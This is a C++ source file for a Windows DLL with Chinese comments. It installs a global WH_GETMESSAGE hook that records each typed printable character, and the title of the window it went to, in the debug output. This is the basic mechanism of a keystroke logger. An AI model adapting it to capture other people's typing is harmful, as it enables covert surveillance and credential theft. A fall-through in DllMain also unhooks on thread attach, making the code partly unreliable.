// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include<Windows.h>
#include<iostream>

HHOOK g_hHook = nullptr;
HINSTANCE g_hInstance = nullptr;
LRESULT CALLBACK MsgHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (HC_ACTION == nCode)//说明有消息到来
	{
		PMSG pMsg = (PMSG)lParam;
		if (WM_CHAR == pMsg->message)
		{
			char szKey = (char)pMsg->wParam;
			//有效的字符消息，在32和126之间
			if (szKey >= 32 && szKey <= 126)
			{
				//是哪个窗口的，内容是什么
				char szWindowName[MAXBYTE] = { 0 };
				char szDebug[MAXBYTE] = { 0 };
				GetWindowTextA(pMsg->hwnd, szWindowName, MAXBYTE);
				sprintf_s(szDebug, MAXBYTE, "窗口:%s接受到一个:%c", szWindowName, szKey);
				OutputDebugStringA(szDebug);
			}
		}
	}
	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

extern "C"
_declspec(dllexport) BOOL StartHook()//函数要导出
{
	g_hHook = SetWindowsHookEx(WH_GETMESSAGE,
		MsgHookProc, g_hInstance, NULL);
	if (nullptr == g_hHook)
	{
		SetLastError(GetLastError());
		return FALSE;
	}
	return TRUE;
}

BOOL UnHook()
{
	if (g_hHook)
	{
		return UnhookWindowsHookEx(g_hHook);
	}
	return FALSE;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH://依附于进程运行于线程，当Dll被加载入进程时触发
		g_hInstance = hModule;
		break;
	case DLL_THREAD_ATTACH://当DLL被线程运行时触发
	case DLL_THREAD_DETACH://在线程运行完成
	case DLL_PROCESS_DETACH://从线程中剥离
		UnHook();
		break;
	}
	return TRUE;
}

